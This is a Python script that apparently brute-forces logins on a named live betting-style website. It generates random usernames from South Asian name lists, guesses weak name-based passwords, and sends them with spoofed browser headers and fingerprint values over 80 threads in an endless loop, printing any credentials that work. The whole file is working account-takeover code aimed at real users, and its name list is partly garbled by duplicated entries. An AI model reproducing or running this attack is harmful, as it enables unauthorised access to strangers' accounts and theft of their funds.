import requests,json
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import random
from mahdix import *
clear()
fasts_names = [
    "Aarav", "Abir", "Adnan", "Afnan", "Ahan", "Ahmed", "Aiden", "Akash", "Alam", "Ali",
    "Aman", "Amin", "Anik", "Anis", "Arif", "Arman", "Asher", "Ashik", "Asif", "Ayman",
    "Aziz", "Bashar", "Bilal", "Bodhi", "Daud", "Ehsan", "Emran", "Fahim", "Farhan", "Firoz",
    "Faisal", "Fazal", "Hadi", "Hamza", "Hasan", "Imran", "Irfan", "Ismail", "Jamal", "Jihan",
    "Kazi", "Khalid", "Kamran", "Karim", "Kashif", "Mahir", "Mahmud", "Mamun", "Mansur",
    "Mashrur", "Mehedi", "Minhaj", "Miraz", "Mizan", "Mobarak", "Moin", "Monir", "Morshed", "Mot"
 "Aarav", "Abir", "Adnan", "Afnan", "Ahan", "Ahmed", "Aiden", "Akash", "Alam", "Ali",
    "Aman", "Amin", "Anik", "Anis", "Arif", "Arman", "Asher", "Ashik", "Asif", "Ayman",
    "Aziz", "Bashar", "Bilal", "Bodhi", "Daud", "Ehsan", "Emran", "Fahim", "Farhan", "Firoz",
    "Faisal", "Fazal", "Hadi", "Hamza", "Hasan", "Imran", "Irfan", "Ismail", "Jamal", "Jihan",
    "Kazi", "Khalid", "Kamran", "Karim", "Kashif", "Mahir", "Mahmud", "Mamun", "Mansur",
    "Mashrur", "Mehedi", "Minhaj", "Miraz", "Mizan", "Mobarak", "Moin", "Monir", "Morshed", "Mot",
    "Nabil", "Nafis", "Nashit", "Nashr", "Nawaf", "Nawaz", "Nazim", "Niaz", "Nihad", "Nihit",
    "Nirav", "Nirban", "Nirjon", "Nirupam", "Nishan", "Nisit", "Nivaan", "Nizam", "Noman", "Noor",
    "Nuha", "Omar", "Omer", "Oni", "Opurbo", "Ornob", "Ovin", "Ovy", "Owais", "Owji",
    "Pankaj", "Parag", "Paras", "Paritosh", "Parth", "Pranav", "Prasad", "Prashant", "Pritam", "Progya",
    "Qamar", "Qasim", "Qazi", "Quamrul", "Rabbi", "Rabiul", "Rafat", "Rafi", "Rafiq", "Rahat",
    "Rahul", "Raihan", "Raisul", "Rakib", "Rakshak", "Rakin", "Rakshit", "Rana", "Ranjan", "Rashad",
    "Rashid", "Ravish", "Rehan", "Reza", "Rezwan", "Riad", "Riaz", "Rifat", "Rifqi", "Rimon",
    "Ripon", "Rishan", "Rishav", "Rishi", "Riyad", "Rizwan", "Rohan", "Rokib", "Roky", "Romel",
    "Rony", "Ruhan", "Ruhul", "Ruksar", "Sabbir", "Sabeer", "Sabir", "Sabit", "Sabuj", "Sachin",
    "Sadiq", "Sadman", "Safal", "Safiq", "Sagar", "Sagor", "Sahil", "Sajal", "Sajid", "Sakib",
    "Sakil", "Sakir", "Salim", "Salman", "Sami", "Samir", "Samit", "Samrat", "Samuel", "Sanaul",
    "Sanjay", "Santo", "Sarfaraz", "Sarim", "Sarwar", "Saswata", "Sayed", "Shabbir", "Shafi", "Shah",
    "Shahid", "Shahin", "Shahriar", "Shahrukh", "Shahzad", "Shakil", "Shamim", "Shams", "Shamsul",
    "Shan", "Shantanu", "Sharif", "Shariq", "Shariyar", "Shashi", "Shawkat", "Shayon", "Shazid",
    "Shihab", "Shohel", "Shohid", "Shuvo", "Siam", "Siddiq", "Sifat", "Sijan", "Sikandar", "Simanto",
    "Sinan", "Siraj", "Siraz", "Siyam", "Sk", "Sohail", "Soham", "Sohan", "Sohel", "Solaiman",
    "Sourav", "Subhan", "Sudip", "Sufian", "Sujan", "Suman", "Sumit", "Sunil", "Sunny", "Supriyo",
    "Suraj", "Surya", "Suvro", "Swadhin", "Swapan", "Swarnadeep", "Syed", "Tajwar", "Talha", "Tanay",
    "Tanbir", "Tanim", "Tanish", "Tanishq", "Tanmay", "Tanvir", "Tariq", "Tasnim", "Tawhid", "Tayyab",
    "Tuhin", "Tuhin", "Tushar", "Udbhav", "Uddalok", "Uddin", "Uddipan", "Uddipta", "Uday", "Udbhav",
    "Udeep", "Udit", "Ujjal", "Ujwal", "Umar", "Upamanyu", "Upendra", "Upoma", "Urbashi", "Urmi",
    "Urmila", "Urooj", "Urvi", "Usama", "Usha", "Ushashi", "Ushasi", "Uzma", "Uzra", "Vaibhav",
    "Vandana", "Vanita", "Varun", "Vasudev", "Vasundhara", "Ved", "Vedant", "Veer", "Vibha", "Vibhuti",
    "Vidhi", "Vidur", "Vidyut", "Vidya", "Vijay", "Vijaya", "Vikas", "Vikram", "Vikrant", "Vimal",
    "Vinay", "Vinaya", "Vineet", "Vinod", "Vinayak", "Vinita", "Vipin", "Vipul", "Viral", "Virat",
    "Vishal", "Vishnu", "Vishwa", "Vivek", "Vrinda", "Vrindavan", "Vritti", "Vyas", "Vyom", "Wahid",
    "Waqar", "Wasim", "Wasiq", "Yadunandan", "Yaduvir", "Yash", "Yashas", "Yashasvi", "Yasin", "Yashraj",
    "Yusuf", "Zaheer", "Zaib", "Zaid", "Zain", "Zakir", "Zaki", "Zakir", "Zaman", "Zarif",
    "Zeeshan", "Zenith", "Zeeshan", "Zeeshan", "Zia", "Zishan", "Zohaib", "Zubair", "Zunaid", "Zyad"

]
_last_names = [
    "Ahmed", "Ali", "Bhuiyan", "Chowdhury", "Das", "Hossain", "Islam", "Khan", "Miah", "Rahman",
    "Sarker", "Uddin", "Mondal", "Choudhury", "Karmakar", "Biswas", "Siddiqui", "Karim", "Hasan", "Barman",
    "Chakraborty", "Roy", "Majumdar", "Banerjee", "Sen", "Ghosh", "Pal", "Bhowmick", "Gupta", "Dutta",
    "Biswas", "Ganguly", "Mitra", "Mondal", "Saha", "Majhi", "Majumder", "Mallick", "Naskar", "Sharma",
    "Biswas", "Chatterjee", "Mukherjee", "Paul", "Bera", "Giri", "Patra", "Shaw", "Dhar", "Nandi",
    "Bhattacharya", "Dutta", "Dey", "Nath", "Bairagi", "Gangopadhyay", "Banik", "Gorai", "Rai", "Ghatak",
    "Bhunia", "Sikder", "Bepari", "Mollick", "Sutradhar", "Dewan", "Barua", "Rana", "Biswas", "Acharya",
    "Rahman", "Ali", "Khan", "Ahmed", "Hasan", "Hossain", "Islam", "Chowdhury", "Haque", 
    "Ahmed", "Hussain", "Akhtar", "Khanam", "Begum", "Choudhury", "Akhter", "Uddin", "Chowdhury", 
    "Miah", "Sarker", "Mia", "Ahmed", "Siddique", "Hossain", "Parvin", "Akter", "Khan", 
    "Amin", "Alam", "Das", "Sultana", "Kabir", "Chowdhury", "Hoque", "Bashar", "Paul", 
    "Roy", "Dewan", "Shikder", "Saha", "Khatun", "Ahmed", "Dewan", "Sardar", "Biswas", 
    "Rahman", "Bepary", "Shil", "Laskar", "Akanda", "Sana", "Shaikh", "Sarder", "Sarkar", 
    "Sarker", "Rana", "Barman", "Baidya", "Saha", "Dey", "Nath", "Rani", "Gazi", 
    "Sha", "Dhar", "Nag", "Dutta", "Ray", "Mandal", "Goswami", "Banik", "Das", 
    "Karmakar", "Nath", "Gupta", "Bhuiyan", "Dasgupta", "Talukder", "Karim", "Dewan", "Mondal", 
    "Saha", "Sarker", "Sheikh", "Chakraborty", "Mandal", "Paul", "Biswas", "Barman", "Baidya", 
    "Roy", "Akanda", "Bepary", "Rani", "Sha", "Ray", "Nag", "Dey", "Sana", "Gazi"
]
clear()
count=0
def login(user_name,pawx):
        for password in pawx:
            
            global count
            count+=1
            headers = {'authority': 'mcwbd55.com','accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'en-US,en;q=0.9,id;q=0.8,bn;q=0.7','content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://mcwbd55.com','referer': 'https://mcwbd55.com/af/n03eET6V/promotions','sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"','sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'userId': user_name,
                'password': password,
                'fingerprint': '3890043948',
                'fingerprint2': '0ae80305420ecc25ba93af20341a6c7c',
                'fingerprintCanvas': '2814906957',
                'fingerprintActiveX': 'c72d334545fa2f9993ad0626da319d44',
                'fingerprintResolution': '812780740',
                'isBioLogin': 'false',
            }

            session=requests.Session()
            response = session.post('https://mcwbd55.com/guest/login',  headers=headers, data=data)
            try:
                response_data = json.loads(response.text)
                message_message = response_data.get('message', '')
                
                if 'account does not exist' in message_message:
                    break
                if 'Your account has been temporarily locked due' in message_message:
                    break
                if 'ok' in message_message.lower():
                    print(f'{count}{LI_WHITE}{user_name}{LI_GREEN} | {LI_WHITE}{password}{LI_GREEN}')
                else:
                     print(message_message,user_name)
            except:pass#print(count,response.text,password)

p(mahdi_logo)
with ThreadPool(max_workers=80) as ahare:
    while True:
        name = f'{random.choice(fasts_names)} {random.choice(_last_names)}'
        fast = name.split(' ')[0]
        mahdi_last = name.split(' ')[1]
        user_name=f"{random.choice(name.split(' ')).lower()}{random.randint(111,9999)}"
        wx = [fast+'1@@',fast+'1234',fast+'123@',fast+'2233@@',fast+'123#@',fast+'123@',fast+'121##@@',mahdi_last+'1234',mahdi_last+'123@',mahdi_last+'2233@@',mahdi_last+'123#@',mahdi_last+'123@']
        ahare.submit(login,user_name,wx)
        slps(15)